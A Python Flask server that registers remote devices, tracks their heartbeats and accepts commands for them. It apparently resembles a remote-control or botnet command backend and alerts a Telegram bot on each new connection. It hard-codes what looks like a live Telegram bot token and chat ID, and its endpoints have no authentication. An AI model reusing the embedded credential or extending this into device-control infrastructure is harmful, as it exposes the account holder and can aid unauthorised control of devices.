from flask import Flask, request, jsonify, abort
import os, json, time, requests

app = Flask(__name__)
DEVICE_FILE = "devices.json"

BOT_TOKEN = "7814616506:AAHixHaptUH9hPcLq3awDS3mqHGScs3y9Yc"
CHAT_ID = "7554840326"

def load_devices():
    if os.path.exists(DEVICE_FILE):
        with open(DEVICE_FILE, "r") as f:
            return json.load(f)
    return {}

def save_devices(devices):
    with open(DEVICE_FILE, "w") as f:
        json.dump(devices, f)

devices = load_devices()

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    device_id = data.get("device_id")
    device_name = data.get("device_name")
    chat_id = data.get("chat_id")

    if device_id and device_name:
        devices[device_id] = {
            "device_name": device_name,
            "chat_id": chat_id,
            "last_seen": time.time()
        }
        save_devices(devices)

        msg = f"✅ Device connected:\nName: {device_name}\nID: {device_id}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
            "chat_id": CHAT_ID,
            "text": msg
        })

        return jsonify({"status": "registered"}), 200

    return jsonify({"error": "Missing fields"}), 400

@app.route("/heartbeat/<device_id>", methods=["POST"])
def heartbeat(device_id):
    if device_id not in devices:
        return abort(404)
    devices[device_id]["last_seen"] = time.time()
    save_devices(devices)
    return jsonify({"status": "ok"}), 200

@app.route("/ping/<device_id>", methods=["GET"])
def ping_device(device_id):
    if device_id not in devices:
        return abort(404)
    last_seen = devices[device_id].get("last_seen", 0)
    if time.time() - last_seen <= 15:  # considered alive if seen within last 15s
        return jsonify({"status": "alive"}), 200
    else:
        return jsonify({"status": "offline"}), 503

@app.route("/devices", methods=["GET"])
def get_devices():
    return jsonify({
        "devices": [
            {
                "device_id": device_id,
                "device_name": device["device_name"]
            } for device_id, device in devices.items()
        ]
    }), 200

@app.route("/command", methods=["POST"])
def send_command():
    data = request.json
    device_id = data.get("device_id")
    command = data.get("command")
    args = data.get("args")
    print(f"[COMMAND] To: {device_id} | CMD: {command} | Args: {args}")
    return jsonify({"status": "sent"}), 200

if __name__ == "__main__":
    print("Flask server running securely on port 10000...")
    app.run(host="0.0.0.0", port=10000)
